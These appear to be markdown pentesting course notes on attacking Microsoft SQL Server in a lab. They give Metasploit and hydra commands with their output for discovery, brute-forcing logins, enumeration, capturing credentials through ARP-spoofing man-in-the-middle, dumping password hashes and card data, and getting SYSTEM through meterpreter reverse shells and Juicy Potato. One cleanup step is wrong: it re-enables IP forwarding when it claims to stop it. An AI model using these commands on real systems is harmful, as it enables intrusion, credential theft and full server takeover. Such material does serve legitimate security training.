# course: data types [w3schools](https://www.w3schools.com/sql/sql_datatypes.asp)

# master db
1. endpoints
2. logins
# model
1. templates
# tempdb
1. stores query temporarily

# ms version of sql is called transact sql

---

# Finding SQL servers in a subnet
```
use auxiliary/scanner/mssql/mssql_ping
set rhosts 20.20.20.0/24
run
```
## output
```
[*] 20.20.20.137:         - SQL Server information for 20.20.20.137:
[+] 20.20.20.137:         -    ServerName      = DB
[+] 20.20.20.137:         -    InstanceName    = SQLEXPRESS
[+] 20.20.20.137:         -    IsClustered     = No
[+] 20.20.20.137:         -    Version         = 13.2.5026.0
[+] 20.20.20.137:         -    tcp             = 1433
```

---

# Nmap script for basic information
```bash
nmap -p 1433 --script ms-sql-info 20.20.20.137
```
## output
```
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
MAC Address: 00:0C:29:20:11:78 (VMware)

Host script results:
| ms-sql-info: 
|   Windows server name: DB
|   20.20.20.137\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2016 SP2
|       number: 13.00.5026.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: SP2
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
```

---

# bruteforcing with hydra
```bash
hydra -L sql_users.txt -P sql_passwords.txt msdb mssql
```
## output
```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-18 17:20:07
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:4/p:3), ~1 try per task
[DATA] attacking mssql://msdb:1433/
[1433][mssql] host: msdb   login: zen   password: Abc123!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-18 17:20:07
```

# Getting MSSQL version
```
use auxiliary/admin/mssql/mssql_sql
set rhosts msdb
set username zen
set password Abc123!!
run
```
## output
```
msf6 auxiliary(admin/mssql/mssql_sql) > run
[*] Running module against 20.20.20.137

[*] 20.20.20.137:1433 - SQL Query: select @@version
[*] 20.20.20.137:1433 - Row Count: 1 (Status: 16 Command: 193)



 NULL
 ----
 Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
        Mar 18 2018 09:11:49 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter Evaluation 10.0 <X64> (Build 14393: ) (
 Hypervisor)

[*] Auxiliary module execution completed
```

# full DB Enumeration
```
use auxiliary/admin/mssql/mssql_enum
set rhosts msdb
set username zen
set password Abc123!!
run
```
## Output
```
[*] Running module against 20.20.20.137

[*] 20.20.20.137:1433 - Running MS SQL Server Enumeration...
[*] 20.20.20.137:1433 - Version:
[*]     Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
[*]             Mar 18 2018 09:11:49 
[*]             Copyright (c) Microsoft Corporation
[*]             Express Edition (64-bit) on Windows Server 2016 Datacenter Evaluation 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 20.20.20.137:1433 - Configuration Parameters:
[*] 20.20.20.137:1433 -         C2 Audit Mode is Not Enabled
[*] 20.20.20.137:1433 -         xp_cmdshell is Enabled
[*] 20.20.20.137:1433 -         remote access is Enabled
[*] 20.20.20.137:1433 -         allow updates is Not Enabled
[*] 20.20.20.137:1433 -         Database Mail XPs is Not Enabled
[*] 20.20.20.137:1433 -         Ole Automation Procedures are Not Enabled
[*] 20.20.20.137:1433 - Databases on the server:
[*] 20.20.20.137:1433 -         Database name:master
[*] 20.20.20.137:1433 -         Database Files for master:
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 20.20.20.137:1433 -         Database name:tempdb
[*] 20.20.20.137:1433 -         Database Files for tempdb:
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 20.20.20.137:1433 -         Database name:model
[*] 20.20.20.137:1433 -         Database Files for model:
[*] 20.20.20.137:1433 -         Database name:msdb
[*] 20.20.20.137:1433 -         Database Files for msdb:
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 20.20.20.137:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL13.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 20.20.20.137:1433 - System Logins on this Server:
[*] 20.20.20.137:1433 -         sa
[*] 20.20.20.137:1433 -         zen
[*] 20.20.20.137:1433 - Disabled Accounts:
[*] 20.20.20.137:1433 -         No Disabled Logins Found
[*] 20.20.20.137:1433 - No Accounts Policy is set for:
[*] 20.20.20.137:1433 -         All System Accounts have the Windows Account Policy Applied to them.
[*] 20.20.20.137:1433 - Password Expiration is not checked for:
[*] 20.20.20.137:1433 -         sa
[*] 20.20.20.137:1433 - System Admin Logins on this Server:
[*] 20.20.20.137:1433 -         sa
[*] 20.20.20.137:1433 - Windows Logins on this Server:
[*] 20.20.20.137:1433 -         No Windows logins found!
[*] 20.20.20.137:1433 - Windows Groups that can logins on this Server:
[*] 20.20.20.137:1433 -         No Windows Groups where found with permission to login to system.
[*] 20.20.20.137:1433 - Accounts with Username and Password being the same:
[*] 20.20.20.137:1433 -         No Account with its password being the same as its username was found.
[*] 20.20.20.137:1433 - Accounts with empty password:
[*] 20.20.20.137:1433 -         No Accounts with empty passwords where found.
[*] 20.20.20.137:1433 - Stored Procedures with Public Execute Permission found:
[*] 20.20.20.137:1433 -         sp_replsetsyncstatus
[*] 20.20.20.137:1433 -         sp_replcounters
[*] 20.20.20.137:1433 -         sp_replsendtoqueue
[*] 20.20.20.137:1433 -         sp_resyncexecutesql
[*] 20.20.20.137:1433 -         sp_prepexecrpc
[*] 20.20.20.137:1433 -         sp_repltrans
[*] 20.20.20.137:1433 -         sp_xml_preparedocument
[*] 20.20.20.137:1433 -         xp_qv
[*] 20.20.20.137:1433 -         xp_getnetname
[*] 20.20.20.137:1433 -         sp_releaseschemalock
[*] 20.20.20.137:1433 -         sp_refreshview
[*] 20.20.20.137:1433 -         sp_replcmds
[*] 20.20.20.137:1433 -         sp_unprepare
[*] 20.20.20.137:1433 -         sp_resyncprepare
[*] 20.20.20.137:1433 -         sp_createorphan
[*] 20.20.20.137:1433 -         xp_dirtree
[*] 20.20.20.137:1433 -         sp_replwritetovarbin
[*] 20.20.20.137:1433 -         sp_replsetoriginator
[*] 20.20.20.137:1433 -         sp_xml_removedocument
[*] 20.20.20.137:1433 -         sp_repldone
[*] 20.20.20.137:1433 -         sp_reset_connection
[*] 20.20.20.137:1433 -         xp_fileexist
[*] 20.20.20.137:1433 -         xp_fixeddrives
[*] 20.20.20.137:1433 -         sp_getschemalock
[*] 20.20.20.137:1433 -         sp_prepexec
[*] 20.20.20.137:1433 -         xp_revokelogin
[*] 20.20.20.137:1433 -         sp_execute_external_script
[*] 20.20.20.137:1433 -         sp_resyncuniquetable
[*] 20.20.20.137:1433 -         sp_replflush
[*] 20.20.20.137:1433 -         sp_resyncexecute
[*] 20.20.20.137:1433 -         xp_grantlogin
[*] 20.20.20.137:1433 -         sp_droporphans
[*] 20.20.20.137:1433 -         xp_regread
[*] 20.20.20.137:1433 -         sp_getbindtoken
[*] 20.20.20.137:1433 -         sp_replincrementlsn
[*] 20.20.20.137:1433 - Instances found on this server:
[*] 20.20.20.137:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 20.20.20.137:1433 -         xp_regread might be disabled in this system
```

---

# SQL Users Enumeration
```
use auxiliary/admin/mssql/mssql_enum_sql_login
set rhosts msdb
set username zen
set password Abc123!!
run
```
## output
```
[*] Running module against 20.20.20.137

[*] 20.20.20.137:1433 - Attempting to connect to the database server at 20.20.20.137:1433 as zen...
[+] 20.20.20.137:1433 - Connected.
[*] 20.20.20.137:1433 - Checking if zen has the sysadmin role...
[*] 20.20.20.137:1433 - zen is NOT a sysadmin.
[*] 20.20.20.137:1433 - Setup to fuzz 300 SQL Server logins.
[*] 20.20.20.137:1433 - Enumerating logins...
[+] 20.20.20.137:1433 - 37 initial SQL Server logins were found.
[*] 20.20.20.137:1433 -  - 
[*] 20.20.20.137:1433 -  - ##Ad Hoc Distributed Queries##
[*] 20.20.20.137:1433 -  - ##Agent XPs##
[*] 20.20.20.137:1433 -  - ##Database Mail XPs##
[*] 20.20.20.137:1433 -  - ##MS_AgentSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 20.20.20.137:1433 -  - ##MS_PolicySigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 20.20.20.137:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SmoExtendedSigningCertificate##
[*] 20.20.20.137:1433 -  - ##Ole Automation Procedures##
[*] 20.20.20.137:1433 -  - ##Replication XPs##
[*] 20.20.20.137:1433 -  - ##SMO and DMO XPs##
[*] 20.20.20.137:1433 -  - ##SQL Mail XPs##
[*] 20.20.20.137:1433 -  - ##Web Assistant Procedures##
[*] 20.20.20.137:1433 -  - ##xp_cmdshell##
[*] 20.20.20.137:1433 -  - BUILTIN\Users
[*] 20.20.20.137:1433 -  - NT AUTHORITY\SYSTEM
[*] 20.20.20.137:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 20.20.20.137:1433 -  - NT SERVICE\SQLWriter
[*] 20.20.20.137:1433 -  - NT SERVICE\Winmgmt
[*] 20.20.20.137:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 20.20.20.137:1433 -  - WIN-60182OFLEV6\Administrator
[*] 20.20.20.137:1433 -  - blanky
[*] 20.20.20.137:1433 -  - bulkadmin
[*] 20.20.20.137:1433 -  - dbcreator
[*] 20.20.20.137:1433 -  - diskadmin
[*] 20.20.20.137:1433 -  - processadmin
[*] 20.20.20.137:1433 -  - public
[*] 20.20.20.137:1433 -  - sa
[*] 20.20.20.137:1433 -  - securityadmin
[*] 20.20.20.137:1433 -  - serveradmin
[*] 20.20.20.137:1433 -  - setupadmin
[*] 20.20.20.137:1433 -  - sysadmin
[*] 20.20.20.137:1433 -  - zen
[*] 20.20.20.137:1433 - Verifying the SQL Server logins...
[+] 20.20.20.137:1433 - 18 SQL Server logins were verified:
[*] 20.20.20.137:1433 -  - ##MS_AgentSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 20.20.20.137:1433 -  - ##MS_PolicySigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 20.20.20.137:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 20.20.20.137:1433 -  - ##MS_SmoExtendedSigningCertificate##
[*] 20.20.20.137:1433 -  - BUILTIN\Users
[*] 20.20.20.137:1433 -  - NT AUTHORITY\SYSTEM
[*] 20.20.20.137:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 20.20.20.137:1433 -  - NT SERVICE\SQLWriter
[*] 20.20.20.137:1433 -  - NT SERVICE\Winmgmt
[*] 20.20.20.137:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 20.20.20.137:1433 -  - WIN-60182OFLEV6\Administrator
[*] 20.20.20.137:1433 -  - blanky
[*] 20.20.20.137:1433 -  - sa
[*] 20.20.20.137:1433 -  - zen
[*] Auxiliary module execution completed
```

---

# SQL Mitm using ettercap and MSF
## Step 1: enable ipv4 forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Step 2: add an iptables rule redirecting traffic for 1433 to us
```bash
iptables -t nat -A PREROUTING -p tcp -d <MSSQL_SERVER_IP> --dport 1433 -j REDIRECT --to-ports 1433
```

## Step 3: arp spoof the MSSQL server using etter cap

## Step 4: set up and run the metasploit module
```
use auxiliary/server/capture/mssql
set SRVHOST <KALI_IP>
run
```
### Output: after a user attempts to log on
```
msf6 auxiliary(server/capture/mssql) > run
[*] Running module against 20.20.20.137
[*] Auxiliary module running as background job 1.

[*] Started service listener on 20.20.20.129:1433 
[*] Server started.
[*] MSSQL LOGIN 20.20.20.130:49676 zen / Abc123!!
```
### Note: the user's logon will fail
`SQL error (18456): login failed for user 'zen'`

## Step 5: stop the forwarding, the arp spoofing and remove the iptables rule
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -D PREROUTING -p tcp -d <MSSQL_SERVER_IP> --dport 1433 -j REDIRECT --to-ports 1433
```

---

# lab: creating a DB
```sql
create database bank;

# select the db before running the query
CREATE TABLE Customers (
       CustomerID int,
       LastName varchar(255),
       FirstName varchar(255),
       passw varchar(255),
       creditcard varchar(255)
);

INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard) VALUES ('01', 'Technologies','Ignite', 'admin123', '1111-2222-3333-4444');
INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard) VALUES ('02', 'Sharma','Nisha', 'admin1234', '5555-6666-7777-8888');
INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard) VALUES ('03', 'Chandel','Raj', 'admin12345', '9999-1010-1020-1030');
INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard) VALUES ('04', 'Madan','Geet', 'admin12311', '1234-5678-9012-3456');
```

---

# authenticated: searching a database for keywords
```
use auxiliary/admin/mssql/mssql_findandsampledata
set sample_size 4
set keywords FirstName|passw|credit
run
```
## output
```
[*] 20.20.20.137:1433     - Attempting to connect to the SQL Server at 20.20.20.137:1433...
[+] 20.20.20.137:1433     - Successfully connected to 20.20.20.137:1433
[*] 20.20.20.137:1433     - Attempting to retrieve data ...
                      
Server                     Database Schema Table     Column     Data Type Sample Data         Row Count
========================== ======== ====== ========= ========== ========= =================== =========
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers creditcard varchar   1111-2222-3333-4444 4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers creditcard varchar   1234-5678-9012-3456 4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers creditcard varchar   5555-6666-7777-8888 4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers creditcard varchar   9999-1010-1020-1030 4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers passw      varchar   admin123            4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers passw      varchar   admin12311          4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers passw      varchar   admin1234           4
WIN-60182OFLEV6\SQLEXPRESS bank     dbo    Customers passw      varchar   admin12345          4       
                                                         
[+] 20.20.20.137:1433     - Query results have been saved to: /root/.msf4/loot/20220720153106_default_20.20.20.137_mssql.data_095579.txt
[*] msdb:1433             - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

# authenticated: dump schema
```
use auxiliary/scanner/mssql/mssql_schemadump
run
```
## output
```
[*] 20.20.20.137:1433     - Instance Name: "SQLEXPRESS"
[+] 20.20.20.137:1433     - Microsoft SQL Server Schema 
 Host: 20.20.20.137 
 Port: 1433 
 Instance: SQLEXPRESS 
 Version: Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
        Mar 18 2018 09:11:49 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter Evaluation 10.0 <X64> (Build 14393: ) (Hypervisor)
 
====================

---
- DBName: bank
  Tables:
  - TableName: Customers
    Columns:
    - ColumnName: CustomerID
      ColumnType: int
      ColumnLength: 4
    - ColumnName: LastName
      ColumnType: varchar
      ColumnLength: 255
    - ColumnName: FirstName
      ColumnType: varchar
      ColumnLength: 255
    - ColumnName: passw
      ColumnType: varchar
      ColumnLength: 255
    - ColumnName: creditcard
      ColumnType: varchar
      ColumnLength: 255
```

---

# authenticated: getting hashes with sql query
```sql
SELECT name,password_hash FROM sys.sql_logins;
```
OR:
```sql
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

---

# authenticated: command execution: getting a meterpreter
```
use exploit/windows/mssql/mssql_payload
run
```

---

# Privesc using juicy potato
## running get privs indicates that we hold the `SeImpersonatePrivilege`
```
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege  <<----
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
## privesc ouput
```
msf6 exploit(windows/local/ms16_075_reflection_juicy) > run

[*] Started reverse TCP handler on 20.20.20.129:9001 
[+] Target appears to be vulnerable (Windows 2016+ (10.0 Build 14393).)
[*] Assigning payload juicypotato.x86.dll
[*] Launching notepad to host the exploit...
[+] Process 3332 launched.
[*] Reflectively injecting the exploit DLL into 3332...
[*] Injecting exploit into 3332...
[*] Exploit injected. Injecting exploit configuration into 3332...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 20.20.20.137
[*] Meterpreter session 2 opened (20.20.20.129:9001 -> 20.20.20.137:49688) at 2022-07-20 16:03:43 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

# authenticated: running single commands
```
use auxiliary/admin/mssql/mssql_exec
set cmd "whoami /all"
run
```

---

# CLR Assmebly for getting a shell
```
use exploit/windows/mssql/mssql_clr_payload
set payload windows/x64/meterpreter/reverse_tcp
```